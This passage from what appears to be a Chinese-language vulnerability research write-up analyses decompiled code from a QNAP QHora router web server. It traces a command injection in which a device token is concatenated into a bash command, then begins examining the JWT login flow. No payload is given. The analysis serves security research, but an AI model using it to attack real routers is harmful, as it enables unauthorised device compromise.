class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">void</span> miro-webserver/controllers/api/system.cloudVerifyDevice</span><br><span class="line">               (undefined8 param_1,undefined8 param_2,undefined8 param_3)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  undefined *puVar1;</span><br><span class="line">  undefined uVar2;</span><br><span class="line">  <span class="type">long</span> *plVar3;</span><br><span class="line">  <span class="type">long</span> lVar4;</span><br><span class="line">  <span class="type">long</span> lVar5;</span><br><span class="line">  ulong uVar6;</span><br><span class="line">  undefined8 uVar7;</span><br><span class="line">  <span class="type">long</span> unaff_x28;</span><br><span class="line">  undefined *unaff_x29;</span><br><span class="line">  undefined8 unaff_x30;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">                    <span class="comment">/* /root/build_qhora-322_2.4.1.634/build/go-gin-webframework-t_qurouter_2.4.1.63 4/miro-webserver/controllers/api/system/hora_system.go:797</span></span><br><span class="line"><span class="comment">                        */</span></span><br><span class="line">    puVar1 = (undefined *)register0x00000008;</span><br><span class="line">    <span class="keyword">if</span> (*(undefined **)(unaff_x28 + <span class="number">0x10</span>) &lt; (undefined *)((<span class="type">long</span>)register0x00000008 + <span class="number">-0x20</span>)) &#123;</span><br><span class="line">      puVar1 = (undefined *)((<span class="type">long</span>)register0x00000008 + <span class="number">-0xa0</span>);</span><br><span class="line">      *(undefined8 *)((<span class="type">long</span>)register0x00000008 + <span class="number">-0xa0</span>) = unaff_x30;</span><br><span class="line">      *(undefined **)((<span class="type">long</span>)register0x00000008 + <span class="number">-0xa8</span>) = unaff_x29;</span><br><span class="line">      unaff_x29 = (undefined *)((<span class="type">long</span>)register0x00000008 + <span class="number">-0xa8</span>);</span><br><span class="line">                    <span class="comment">/* /root/build_qhora-322_2.4.1.634/build/go-gin-webframework-t_qurouter_2.4.1.63 4/miro-webserver/controllers/api/system/hora_system.go:800</span></span><br><span class="line"><span class="comment">                        */</span></span><br><span class="line">      *(undefined **)((<span class="type">long</span>)register0x00000008 + <span class="number">-0x98</span>) = &amp;DAT_00faea90;</span><br><span class="line">      *(undefined8 *)((<span class="type">long</span>)register0x00000008 + <span class="number">-0x90</span>) = <span class="number">0xc</span>;</span><br><span class="line">      regexp.MustCompile(*(undefined8 *)((<span class="type">long</span>)register0x00000008 + <span class="number">-0x98</span>),</span><br><span class="line">                         *(undefined8 *)((<span class="type">long</span>)register0x00000008 + <span class="number">-0x90</span>),</span><br><span class="line">                         *(undefined8 *)((<span class="type">long</span>)register0x00000008 + <span class="number">-0x88</span>));</span><br><span class="line">      *(undefined8 *)((<span class="type">long</span>)register0x00000008 + <span class="number">-0x20</span>) =</span><br><span class="line">           *(undefined8 *)((<span class="type">long</span>)register0x00000008 + <span class="number">-0x88</span>);</span><br><span class="line">                    <span class="comment">/* /root/build_qhora-322_2.4.1.634/build/go-gin-webframework-t_qurouter_2.4.1.63 4/miro-webserver/controllers/api/system/hora_system.go:802</span></span><br><span class="line"><span class="comment">                        */</span></span><br><span class="line">      *(undefined8 *)((<span class="type">long</span>)register0x00000008 + <span class="number">-0x98</span>) = <span class="number">0</span>;</span><br><span class="line">      *(undefined **)((<span class="type">long</span>)register0x00000008 + <span class="number">-0x90</span>) = <span class="string">&quot;/usr/bin/qcloud_control_tool verify_device&quot;</span>;</span><br><span class="line">      *(undefined8 *)((<span class="type">long</span>)register0x00000008 + <span class="number">-0x88</span>) = <span class="number">0x2b</span>;</span><br><span class="line">      *(undefined8 *)((<span class="type">long</span>)register0x00000008 + <span class="number">-0x80</span>) =</span><br><span class="line">           *(undefined8 *)((<span class="type">long</span>)register0x00000008 + <span class="number">8</span>);</span><br><span class="line">      *(undefined8 *)((<span class="type">long</span>)register0x00000008 + <span class="number">-0x78</span>) =</span><br><span class="line">           *(undefined8 *)((<span class="type">long</span>)register0x00000008 + <span class="number">0x10</span>);</span><br><span class="line">      runtime.concatstring2 <span class="comment">//[1]</span></span><br><span class="line">                (*(undefined8 *)((<span class="type">long</span>)register0x00000008 + <span class="number">-0x98</span>),</span><br><span class="line">                 *(undefined8 *)((<span class="type">long</span>)register0x00000008 + <span class="number">-0x90</span>),</span><br><span class="line">                 *(undefined8 *)((<span class="type">long</span>)register0x00000008 + <span class="number">-0x88</span>),</span><br><span class="line">                 *(undefined8 *)((<span class="type">long</span>)register0x00000008 + <span class="number">-0x80</span>),</span><br><span class="line">                 *(undefined8 *)((<span class="type">long</span>)register0x00000008 + <span class="number">-0x78</span>),</span><br><span class="line">                 *(undefined8 *)((<span class="type">long</span>)register0x00000008 + <span class="number">-0x70</span>),</span><br><span class="line">                 *(undefined8 *)((<span class="type">long</span>)register0x00000008 + <span class="number">-0x68</span>));</span><br><span class="line">                    <span class="comment">/* /root/build_qhora-322_2.4.1.634/build/go-gin-webframework-t_qurouter_2.4.1.63 4/miro-webserver/controllers/api/system/hora_system.go:803</span></span><br><span class="line"><span class="comment">                        */</span></span><br><span class="line">      *(undefined8 *)((<span class="type">long</span>)register0x00000008 + <span class="number">-0x98</span>) =</span><br><span class="line">           *(undefined8 *)((<span class="type">long</span>)register0x00000008 + <span class="number">-0x70</span>);</span><br><span class="line">      *(undefined8 *)((<span class="type">long</span>)register0x00000008 + <span class="number">-0x90</span>) =</span><br><span class="line">           *(undefined8 *)((<span class="type">long</span>)register0x00000008 + <span class="number">-0x68</span>);</span><br><span class="line">      miro-webserver/controllers/api/config.RunExec <span class="comment">//[2]</span></span><br><span class="line">                (*(undefined8 *)((<span class="type">long</span>)register0x00000008 + <span class="number">-0x98</span>),</span><br><span class="line">                 *(undefined8 *)((<span class="type">long</span>)register0x00000008 + <span class="number">-0x90</span>),</span><br><span class="line">                 *(undefined8 *)((<span class="type">long</span>)register0x00000008 + <span class="number">-0x88</span>),</span><br><span class="line">                 *(undefined8 *)((<span class="type">long</span>)register0x00000008 + <span class="number">-0x80</span>),</span><br><span class="line">                 *(undefined8 *)((<span class="type">long</span>)register0x00000008 + <span class="number">-0x78</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>[1]拼接字符串和我们的device_token, 并进入[2]<code>miro-webserver/controllers/api/config.RunExec</code> , 并在其中使用<code>exec.Command</code>执行了命令</p>
</blockquote>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">void</span> miro-webserver/controllers/api/config.RunExec</span><br><span class="line">               (undefined8 param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4,</span><br><span class="line">               undefined8 param_5)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  undefined8 uVar1;</span><br><span class="line">  <span class="type">long</span> unaff_x28;</span><br><span class="line">  undefined8 uVar2;</span><br><span class="line">  undefined8 in_stack_fffffffffffffef8;</span><br><span class="line">  undefined **ppuVar3;</span><br><span class="line">  runtime._type **pprVar4;</span><br><span class="line">  undefined **ppuVar5;</span><br><span class="line">  undefined8 uVar6;</span><br><span class="line">  <span class="type">long</span> lVar7;</span><br><span class="line">  undefined8 uVar8;</span><br><span class="line">  undefined8 in_stack_ffffffffffffff10;</span><br><span class="line">  undefined8 in_stack_ffffffffffffff18;</span><br><span class="line">  undefined8 local_a0;</span><br><span class="line">  runtime._type *local_98;</span><br><span class="line">  runtime._type **local_90;</span><br><span class="line">  runtime._type *local_88;</span><br><span class="line">  undefined **local_80;</span><br><span class="line">  runtime._type *local_78;</span><br><span class="line">  undefined **local_70;</span><br><span class="line">  runtime._type *local_68;</span><br><span class="line">  undefined *local_60;</span><br><span class="line">  runtime._type *local_58;</span><br><span class="line">  runtime._type *local_48;</span><br><span class="line">  undefined8 local_40;</span><br><span class="line">  runtime._type *local_38;</span><br><span class="line">  undefined **local_30;</span><br><span class="line">  undefined *local_28;</span><br><span class="line">  undefined8 local_20;</span><br><span class="line">  undefined8 local_18;</span><br><span class="line">  undefined8 local_10;</span><br><span class="line">  </span><br><span class="line">                    <span class="comment">/* /root/build_qhora-322_2.4.1.634/build/go-gin-webframework-t_qurouter_2.4.1.63 4/miro-webserver/controllers/api/config/tools.go:59</span></span><br><span class="line"><span class="comment">                        */</span></span><br><span class="line">  <span class="keyword">while</span> (uVar1 = DAT_017fa2a8, &amp;local_a0 &lt;= *(undefined8 **)(unaff_x28 + <span class="number">0x10</span>)) &#123;</span><br><span class="line">                    <span class="comment">/* /root/build_qhora-322_2.4.1.634/build/go-gin-webframework-t_qurouter_2.4.1.63 4/miro-webserver/controllers/api/config/tools.go:59</span></span><br><span class="line"><span class="comment">                        */</span></span><br><span class="line">    runtime.morestack_noctxt();</span><br><span class="line">  &#125;</span><br><span class="line">  uVar2 = param_2;</span><br><span class="line">                    <span class="comment">/* /root/build_qhora-322_2.4.1.634/build/go-gin-webframework-t_qurouter_2.4.1.63 4/miro-webserver/controllers/api/config/tools.go:68</span></span><br><span class="line"><span class="comment">                        */</span></span><br><span class="line">  runtime.convTstring(param_1,param_2,in_stack_fffffffffffffef8);</span><br><span class="line">  local_68 = &amp;datatype.String.<span class="built_in">string</span>;</span><br><span class="line">  local_60 = &amp;goss_Run_Cmd:__1168c70;</span><br><span class="line">  local_58 = &amp;datatype.String.<span class="built_in">string</span>;</span><br><span class="line">                    <span class="comment">/* /root/build_qhora-322_2.4.1.634/build/go-gin-webframework-t_qurouter_2.4.1.63 4/miro-webserver/vendor/github.com/sirupsen/logrus/logger.go:202</span></span><br><span class="line"><span class="comment">                        */</span></span><br><span class="line">  github.com/sirupsen/logrus.(*Logger).Log</span><br><span class="line">            (uVar1,CONCAT44((<span class="type">int</span>)((ulong)uVar2 &gt;&gt; <span class="number">0x20</span>),<span class="number">5</span>),&amp;local_68,<span class="number">2</span>,<span class="number">2</span>);</span><br><span class="line">                    <span class="comment">/* /root/build_qhora-322_2.4.1.634/build/go-gin-webframework-t_qurouter_2.4.1.63 4/miro-webserver/controllers/api/config/tools.go:69</span></span><br><span class="line"><span class="comment">                        */</span></span><br><span class="line">  local_28 = &amp;SUB_00fa4dc9;</span><br><span class="line">  local_20 = <span class="number">2</span>;</span><br><span class="line">  local_18 = param_1;</span><br><span class="line">  local_10 = param_2;</span><br><span class="line">  uVar2 = <span class="number">4</span>;</span><br><span class="line">  ppuVar3 = &amp;local_28;</span><br><span class="line">  uVar6 = <span class="number">2</span>;</span><br><span class="line">  lVar7 = <span class="number">2</span>;</span><br><span class="line">  os/exec.Command(<span class="string">&quot;bash&quot;</span>,<span class="number">4</span>,ppuVar3,<span class="number">2</span>,<span class="number">2</span>,in_stack_ffffffffffffff10);</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>非常经典的命令注入, 唯一的难点在与需要更多的时间去看这个难以阅读的代码.</p>
</blockquote>
<h3 id="vuln-3"><a href="#vuln-3" class="headerlink" title="vuln-3"></a>vuln-3</h3><blockquote>
<p>当然我们找不到未授权的漏洞时候, 就会去看登录和鉴权所以下面这个漏洞就出现在登录接口, 一样和云服务有关.</p>
</blockquote>
<blockquote>
<p>了解一下前置知识, 前面提到过这个web使用的认证框架是<code>gin-jwt</code>, 看一下是怎么设置这个结构体的.</p>
</blockquote>
<div class="code-container" data-rel="Go"><figure class="iseeu highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">initParams</span><span class="params">()</span></span> *jwt.GinJWTMiddleware &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> &amp;jwt.GinJWTMiddleware&#123;</span><br><span class="line">    Realm:       <span class="string">&quot;test zone&quot;</span>,</span><br><span class="line">    Key:         []<span class="type">byte</span>(<span class="string">&quot;secret key&quot;</span>),</span><br><span class="line">    Timeout:     time.Hour,</span><br><span class="line">    MaxRefresh:  time.Hour,</span><br><span class="line">    IdentityKey: identityKey,</span><br><span class="line">    PayloadFunc: payloadFunc(),</span><br><span class="line"></span><br><span class="line">    IdentityHandler: identityHandler(),</span><br><span class="line">    Authenticator:   authenticator(), <span class="comment">//这里就是验证登录的函数</span></span><br><span class="line">    Authorizator:    authorizator(),</span><br><span class="line">    Unauthorized:    unauthorized(),</span><br><span class="line">    TokenLookup:     <span class="string">&quot;header: Authorization, query: token, cookie: jwt&quot;</span>,</span><br><span class="line">    <span class="comment">// TokenLookup: &quot;query:token&quot;,</span></span><br><span class="line">    <span class="comment">// TokenLookup: &quot;cookie:token&quot;,</span></span><br><span class="line">    TokenHeadName: <span class="string">&quot;Bearer&quot;</span>,</span><br><span class="line">    TimeFunc:      time.Now,</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>那在我们的ghidra分析的代码中是怎么定义这个结构体的呢, 部分函数我已经重新命名了, 如果第一次打开你只会看到func1和func*.</p>
</blockquote>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> miro-webserver/controllers/api/login.MiroHoraLoginInit(<span class="type">void</span>)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  undefined *puVar1;</span><br><span class="line">  undefined8 *puVar2;</span><br><span class="line">  <span class="type">long</span> unaff_x28;</span><br><span class="line">  undefined8 in_stack_ffffffffffffffb8;</span><br><span class="line">  undefined8 *puVar3;</span><br><span class="line">  undefined8 *in_stack_ffffffffffffffc0;</span><br><span class="line">  undefined8 *puVar4;</span><br><span class="line">  undefined8 in_stack_ffffffffffffffc8;</span><br><span class="line">  undefined8 uVar5;</span><br><span class="line">  undefined8 uVar6;</span><br><span class="line">  </span><br><span class="line">                    <span class="comment">/* /root/build_qhora-322_2.4.1.634/build/go-gin-webframework-t_qurouter_2.4.1.63 4/miro-webserver/controllers/api/login/login.go:127</span></span><br><span class="line"><span class="comment">                        */</span></span><br><span class="line">  <span class="keyword">while</span> (&amp;stack0x00000000 &lt;= *(undefined **)(unaff_x28 + <span class="number">0x10</span>)) &#123;</span><br><span class="line">                    <span class="comment">/* /root/build_qhora-322_2.4.1.634/build/go-gin-webframework-t_qurouter_2.4.1.63 4/miro-webserver/controllers/api/login/login.go:127</span></span><br><span class="line"><span class="comment">                        */</span></span><br><span class="line">    runtime.morestack_noctxt();</span><br><span class="line">  &#125;</span><br><span class="line">                    <span class="comment">/* /root/build_qhora-322_2.4.1.634/build/go-gin-webframework-t_qurouter_2.4.1.63 4/miro-webserver/controllers/api/login/login.go:131</span></span><br><span class="line"><span class="comment">                        */</span></span><br><span class="line">  miro-webserver/controllers/api/login.generateKey</span><br><span class="line">            (in_stack_ffffffffffffffb8,in_stack_ffffffffffffffc0,in_stack_ffffffffffffffc8);</span><br><span class="line">  puVar2 = in_stack_ffffffffffffffc0;</span><br><span class="line">  uVar5 = in_stack_ffffffffffffffc8;</span><br><span class="line">                    <span class="comment">/* /root/build_qhora-322_2.4.1.634/build/go-gin-webframework-t_qurouter_2.4.1.63 4/miro-webserver/controllers/api/login/login.go:128</span></span><br><span class="line"><span class="comment">                        */</span></span><br><span class="line">  runtime.newobject(&amp;datatype.Struct.jwt.GinJWTMiddleware,in_stack_ffffffffffffffc0);</span><br><span class="line">                    <span class="comment">/* /root/build_qhora-322_2.4.1.634/build/go-gin-webframework-t_qurouter_2.4.1.63 4/miro-webserver/controllers/api/login/login.go:129</span></span><br><span class="line"><span class="comment">                        */</span></span><br><span class="line">  puVar2[<span class="number">1</span>] = <span class="number">4</span>;</span><br><span class="line">  *puVar2 = &amp;DAT_00fa5acc;</span><br><span class="line">                    <span class="comment">/* /root/build_qhora-322_2.4.1.634/build/go-gin-webframework-t_qurouter_2.4.1.63 4/miro-webserver/controllers/api/login/login.go:131</span></span><br><span class="line"><span class="comment">                        */</span></span><br><span class="line">  puVar2[<span class="number">5</span>] = in_stack_ffffffffffffffc0;</span><br><span class="line">  puVar2[<span class="number">6</span>] = in_stack_ffffffffffffffc8;</span><br><span class="line">  puVar4 = puVar2;</span><br><span class="line">  <span class="keyword">if</span> (DAT_01830e10 == <span class="number">0</span>) &#123;</span><br><span class="line">    puVar2[<span class="number">4</span>] = in_stack_ffffffffffffffb8;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    runtime.gcWriteBarrier();</span><br><span class="line">                    <span class="comment">/* /root/build_qhora-322_2.4.1.634/build/go-gin-webframework-t_qurouter_2.4.1.63 4/miro-webserver/controllers/api/login/login.go:129</span></span><br><span class="line"><span class="comment">                        */</span></span><br><span class="line">  &#125;</span><br><span class="line">                    <span class="comment">/* /root/build_qhora-322_2.4.1.634/build/go-gin-webframework-t_qurouter_2.4.1.63 4/miro-webserver/controllers/api/login/login.go:132</span></span><br><span class="line"><span class="comment">                        */</span></span><br><span class="line">  puVar2[<span class="number">7</span>] = <span class="number">18000000000000</span>;</span><br><span class="line">                    <span class="comment">/* /root/build_qhora-322_2.4.1.634/build/go-gin-webframework-t_qurouter_2.4.1.63 4/miro-webserver/controllers/api/login/login.go:133</span></span><br><span class="line"><span class="comment">                        */</span></span><br><span class="line">  puVar2[<span class="number">8</span>] = <span class="number">18000000000000</span>;</span><br><span class="line">  puVar1 = goss_Miro_login_1785620;</span><br><span class="line">                    <span class="comment">/* /root/build_qhora-322_2.4.1.634/build/go-gin-webframework-t_qurouter_2.4.1.63 4/miro-webserver/controllers/api/login/login.go:134</span></span><br><span class="line"><span class="comment">                        */</span></span><br><span class="line">  puVar2[<span class="number">0x12</span>] = DAT_01785628;</span><br><span class="line">  <span class="keyword">if</span> (DAT_01830e10 == <span class="number">0</span>) &#123;</span><br><span class="line">    puVar2[<span class="number">0x11</span>] = puVar1;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    runtime.gcWriteBarrier();</span><br><span class="line">  &#125;</span><br><span class="line">                    <span class="comment">/* /root/build_qhora-322_2.4.1.634/build/go-gin-webframework-t_qurouter_2.4.1.63 4/miro-webserver/controllers/api/login/login.go:128</span></span><br><span class="line"><span class="comment">                        */</span></span><br><span class="line">                    <span class="comment">/* /root/build_qhora-322_2.4.1.634/build/go-gin-webframework-t_qurouter_2.4.1.63 4/miro-webserver/controllers/api/login/login.go:135</span></span><br><span class="line"><span class="comment">                        */</span></span><br><span class="line">  puVar2[<span class="number">0xb</span>] = &amp;PTR_miro-webserver/controllers/api/login.MiroHoraLoginInit.func1_PayloadFunc;</span><br><span class="line">                    <span class="comment">/* /root/build_qhora-322_2.4.1.634/build/go-gin-webframework-t_qurouter_2.4.1.63 4/miro-webserver/controllers/api/login/login.go:146</span></span><br><span class="line"><span class="comment">                        */</span></span><br><span class="line">  puVar2[<span class="number">0x10</span>] = &amp;PTR_miro-webserver/controllers/api/login.MiroHoraLoginInit.func2_IdentityHandler;</span><br><span class="line">                    <span class="comment">/* /root/build_qhora-322_2.4.1.634/build/go-gin-webframework-t_qurouter_2.4.1.63 4/miro-webserver/controllers/api/login/login.go:155</span></span><br><span class="line"><span class="comment">                        */</span></span><br><span class="line">  puVar2[<span class="number">9</span>] = &amp;PTR_miro-webserver/controllers/api/login.MiroHoraLoginInit.func3_Loginv1; <span class="comment">//[1]</span></span><br><span class="line">                    <span class="comment">/* /root/build_qhora-322_2.4.1.634/build/go-gin-webframework-t_qurouter_2.4.1.63 4/miro-webserver/controllers/api/login/login.go:331</span></span><br><span class="line"><span class="comment">                        */</span></span><br><span class="line">  puVar2[<span class="number">10</span>] = &amp;PTR_miro-webserver/controllers/api/login.MiroHoraLoginInit.func4_Authorizator;</span><br><span class="line">                    <span class="comment">/* /root/build_qhora-322_2.4.1.634/build/go-gin-webframework-t_qurouter_2.4.1.63 4/miro-webserver/controllers/api/login/login.go:345</span></span><br><span class="line"><span class="comment">                        */</span></span><br><span class="line">  puVar2[<span class="number">0xc</span>] = &amp;PTR_miro-webserver/controllers/api/login.MiroHoraLoginInit.func5_Unauthorized;</span><br><span class="line">                    <span class="comment">/* /root/build_qhora-322_2.4.1.634/build/go-gin-webframework-t_qurouter_2.4.1.63 4/miro-webserver/controllers/api/login/login.go:425</span></span><br><span class="line"><span class="comment">                        */</span></span><br><span class="line">  puVar2[<span class="number">0x14</span>] = <span class="number">0x30</span>;</span><br><span class="line">  puVar2[<span class="number">0x13</span>] = &amp;DAT_00fe3142;</span><br><span class="line">                    <span class="comment">/* /root/build_qhora-322_2.4.1.634/build/go-gin-webframework-t_qurouter_2.4.1.63 4/miro-webserver/controllers/api/login/login.go:430</span></span><br><span class="line"><span class="comment">                        */</span></span><br><span class="line">  puVar2[<span class="number">0x16</span>] = <span class="number">6</span>;</span><br><span class="line">  puVar2[<span class="number">0x15</span>] = &amp;DAT_00fa7673;</span><br><span class="line">                    <span class="comment">/* /root/build_qhora-322_2.4.1.634/build/go-gin-webframework-t_qurouter_2.4.1.63 4/miro-webserver/controllers/api/login/login.go:433</span></span><br><span class="line"><span class="comment">                        */</span></span><br><span class="line">  puVar2[<span class="number">0x17</span>] = &amp;PTR_time.Now_01030c10;</span><br><span class="line">                    <span class="comment">/* /root/build_qhora-322_2.4.1.634/build/go-gin-webframework-t_qurouter_2.4.1.63 4/miro-webserver/controllers/api/login/login.go:434</span></span><br><span class="line"><span class="comment">                        */</span></span><br><span class="line">  puVar2[<span class="number">0xd</span>] = &amp;PTR_miro-webserver/controllers/api/login.MiroHoraLoginInit.func6_LoginResponse;</span><br><span class="line">                    <span class="comment">/* /root/build_qhora-322_2.4.1.634/build/go-gin-webframework-t_qurouter_2.4.1.63 4/miro-webserver/controllers/api/login/login.go:489</span></span><br><span class="line"><span class="comment">                        */</span></span><br><span class="line">  puVar2[<span class="number">0xe</span>] = &amp;PTR_miro-webserver/controllers/api/login.MiroHoraLoginInit.func7_LogoutResponse;</span><br><span class="line">                    <span class="comment">/* /root/build_qhora-322_2.4.1.634/build/go-gin-webframework-t_qurouter_2.4.1.63 4/miro-webserver/controllers/api/login/login.go:505</span></span><br><span class="line"><span class="comment">                        */</span></span><br><span class="line">  puVar2[<span class="number">0xf</span>] = &amp;PTR_miro-webserver/controllers/api/login.MiroHoraLoginInit.func8_RefreshResponse;</span><br><span class="line">  puVar3 = puVar2;</span><br><span class="line">                    <span class="comment">/* /root/build_qhora-322_2.4.1.634/build/go-gin-webframework-t_qurouter_2.4.1.63 4/miro-webserver/vendor/github.com/appleboy/gin-jwt/v2/auth_jwt.go:197</span></span><br><span class="line"><span class="comment">                        */</span></span><br><span class="line">  github.com/appleboy/gin-jwt/v2.(*GinJWTMiddleware).MiddlewareInit(puVar2,puVar4,uVar5);</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>登录的函数[1], 这个函数中有两个主要函数</p>
</blockquote>
<blockquote>
<p>本地认证通过<code>login.checkLocalAccount</code>函数完成,并调用sql查询,sql查询的函数如下，使用<code>gorm</code>库查询.</p>
</blockquote>
 <div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">GetUserByCategory</span><span class="params">()</span>&#123;</span><br><span class="line"> runtime.newobject(&amp;datatype.Array.[<span class="number">1</span>]interface_&#123;&#125;,lVar1);</span><br><span class="line"> lVar2 = lVar1;</span><br><span class="line"> runtime.convT64(param_2,lVar1);</span><br><span class="line"> *(runtime._type **)lVar1 = &amp;datatype.Int.<span class="type">int</span>;</span><br><span class="line"> <span class="keyword">if</span> (DAT_01830e10 == <span class="number">0</span>) &#123;</span><br><span class="line">   *(<span class="type">long</span> *)(lVar1 + <span class="number">8</span>) = lVar2;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">else</span> &#123;</span><br><span class="line">   runtime.gcWriteBarrier();</span><br><span class="line"> &#125;</span><br><span class="line"> github.com/jinzhu/gorm.(*DB).Where</span><br><span class="line">           (lVar3,&amp;datatype.String.<span class="built_in">string</span>,&amp;goss_category_=_?_116bd80,lVar1,<span class="number">1</span>,<span class="number">1</span>,</span><br><span class="line">            in_stack_ffffffffffffffc8);</span><br><span class="line"> uVar4 = <span class="number">0</span>;</span><br><span class="line"> uVar5 = <span class="number">0</span>;</span><br><span class="line"> github.com/jinzhu/gorm.(*DB).Find</span><br><span class="line">           (in_stack_ffffffffffffffc8,&amp;datatype.Ptr.*[]models.UserProfile,in_stack_ffffffffffffffa0</span><br><span class="line">            ,<span 